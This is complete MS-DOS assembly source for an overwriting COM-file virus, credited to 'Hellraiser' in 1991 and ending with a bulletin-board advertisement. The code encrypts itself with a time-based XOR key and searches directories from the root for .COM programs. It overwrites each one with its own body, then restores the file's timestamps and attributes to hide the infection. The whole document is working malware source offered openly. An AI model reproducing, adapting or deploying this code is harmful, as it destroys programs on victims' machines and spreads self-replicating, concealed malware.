; HR Virus Strain B-Compacted
; Bad Brains
; Created 8/5/91 by Hellraiser
; Destructive Code - Beware!

fileattr   EQU      21
filetime   EQU      22
filedate   EQU      24
filename   EQU      30

virus_size EQU      554
code_start EQU      0100h

code     segment  'code'
assume   cs:code,ds:code,es:code
         org      code_start

main proc   near

jmp    virus_start

encrypt_val    dw     0000h

virus_start:

     call     encrypt                  ;encrypt/decrypt file
     jmp      virus                    ;go to start of code

encrypt:

     push     cx
     mov      cx,offset virus_code+virus_size
     mov      si,offset virus_code     ;start encryption at data
     mov      di,si
     cld

xor_loop:

     lodsw
     xor      ax,encrypt_val           ;get encryption key
     stosw
     dec      cx
     jcxz     stoppa
     jmp      xor_loop

stoppa:

     pop      cx
     ret

infectfile:

     mov     dx,code_start             ;where virus starts in memory
     mov     bx,handle                 ;load bx with handle
     mov     cx,virus_size             ;number of bytes to write
     call    encrypt                   ;encrypt file
     mov     ax,4000h                  ;write to file
     int     21h                       ;
     call    encrypt                   ;fix up the mess
     ret

virus_code:

vname        db     'SKISM',0
wildcards    db     "*",0              ;search for directory argument
filespec     db     "*.COM",0          ;search for EXE file argument
rootdir      db     "\",0              ;argument for root directory
dirdata      db     43 dup (?)         ;holds directory DTA
filedata     db     43 dup (?)         ;holds files DTA
diskdtaseg   dw     ?                  ;holds disk dta segment
diskdtaofs   dw     ?                  ;holds disk dta offset
tempofs      dw     ?
tempseg      dw     ?
drivecode    db     ?                  ;holds drive code
currentdir   db     64 dup (?)         ;save current directory into this
handle       dw     ?                  ;holds file handle
orig_time    dw     ?
orig_date    dw     ?
orig_attr    dw     ?
idbuffer     dw     2 dup  (?)

virus:

      mov    ax,3000h                  ;get dos version
      int    21h                       ;
      cmp    al,02h                    ;is it at least 2.00?
      jb     bus                       ;won't infect less than 3.00
      mov    ah,2ch                    ;get time
      int    21h                       ;
      add    dh,cl                     ;add the two registers
      mov    encrypt_val,dx            ;save m_seconds to encrypt val so
                                       ;we have up to 65,535 mutations


setdta:

     mov     dx,offset dirdata         ;offset of where to hold new dta
     mov     ah,1ah                    ;set dta address
     int     21h                       ;

newdir:

     mov     ah,19h                    ;get drive code
     int     21h                       ;
     mov     dl,al                     ;save drivecode
     inc     dl                        ;add one to dl, because functions differ
     mov     ah,47h                    ;get current directory
     mov     si, offset currentdir     ;buffer to save directory in
     int     21h                       ;

     mov     dx,offset rootdir         ;move dx to change to root directory
     mov     ah,3bh                    ;change directory to root
     int     21h                       ;

scandirs:

     mov     cx,13h                    ;look for directorys
     mov     dx, offset wildcards      ;look for '*'
     mov     ah,4eh                    ;find first file
     int     21h                       ;
     cmp     ax,12h                    ;no first file?
     jne     dirloop                   ;no dirs found? bail out

bus:
     jmp     abort

copyright  db  'Bad Brains'

dirloop:

     mov     ah,4fh                    ;find next file
     int     21h                       ;
     cmp     ax,12h
     je      quit                      ;no more dirs found, roll out

chdir:

     mov     dx,offset dirdata+filename;point dx to fcb - filename
     mov     ah,3bh                    ;change directory
     int     21h                       ;

     mov     ah,2fh                    ;get current dta address
     int     21h                       ;
     mov     [diskdtaseg],es           ;save old segment
     mov     [diskdtaofs],bx           ;save old offset
     mov     dx,offset filedata        ;offset of where to hold new dta
     mov     ah,1ah                    ;set dta address
     int     21h                       ;

scandir:

     mov     cx,07h                    ;find any attribute
     mov     dx,offset filespec        ;point dx to "*.EXE",0
     mov     ah,4eh                    ;find first file function
     int     21h                       ;
     cmp     ax,12h                    ;was file found?
     jne     transform

nextexe:

     mov     ah,4fh                    ;find next file
     int     21h                       ;
     cmp     ax,12h                    ;none found
     jne     transform                 ;found see what we can do

     mov     dx,offset rootdir         ;move dx to change to root directory
     mov     ah,3bh                    ;change directory to root
     int     21h                       ;
     mov     ah,1ah                    ;set dta address
     mov     ds,[diskdtaseg]           ;restore old segment
     mov     dx,[diskdtaofs]           ;restore old offset
     int     21h                       ;
     jmp     dirloop

quit:

     jmp     rollout


transform:

     mov     ah,2fh                    ;temporally store dta
     int     21h                       ;
     mov     [tempseg],es              ;save old segment
     mov     [tempofs],bx              ;save old offset
     mov     dx, offset filedata + filename

     mov     bx,offset filedata               ;save file...
     mov     ax,[bx]+filedate          ;date
     mov     orig_date,ax              ;
     mov     ax,[bx]+filetime          ;time
     mov     orig_time,ax              ;    and
     mov     ax,[bx]+fileattr          ;
     mov     ax,4300h
     int     21h
     mov     orig_attr,cx
     mov     ax,4301h                  ;change attributes
     xor     cx,cx                     ;clear attributes
     int     21h                       ;
     mov     ax,3d00h                  ;open file - read
     int     21h                       ;
     jc      fixup                     ;error - find another file
     mov     handle,ax                 ;save handle
     mov     ah,3fh                    ;read from file
     mov     bx,handle                 ;move handle to bx
     mov     cx,02h                    ;read 2 bytes
     mov     dx,offset idbuffer        ;save to buffer
     int     21h                       ;

     mov     ah,3eh                    ;close file for now
     mov     bx,handle                 ;load bx with handle
     int     21h                       ;

     mov     bx, idbuffer              ;fill bx with id string
     cmp     bx,03ebh                  ;infected?
     jne     doit                      ;same - find another file


fixup:
     mov     ah,1ah                    ;set dta address
     mov     ds,[tempseg]              ;restore old segment
     mov     dx,[tempofs]              ;restore old offset
     int     21h                       ;
     jmp     nextexe


doit:

     mov     dx, offset filedata + filename
     mov     ax,3d02h                  ;open file read/write access
     int     21h                       ;
     mov     handle,ax                 ;save handle

     call    infectfile

     ;mov     ax,3eh                    ;close file
     ;int     21h

rollout:

     mov     ax,5701h                  ;restore original
     mov     bx,handle                 ;
     mov     cx,orig_time              ;time and
     mov     dx,orig_date              ;date
     int     21h                       ;

     mov     ax,4301h                  ;restore original attributes
     mov     cx,orig_attr
     mov     dx,offset filedata + filename
     int     21h
     ;mov     bx,handle
     ;mov     ax,3eh                   ;close file
     ;int     21h
     mov     ah,3bh                    ;try to fix this
     mov     dx,offset rootdir         ;for speed
     int     21h                       ;
     mov     ah,3bh                    ;change directory
     mov     dx,offset currentdir      ;back to original
     int     21h                       ;

Abort:

     mov     ax,4c00h                  ;end program
     int     21h                       ;


main     endp
code     ends
         end      main


; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

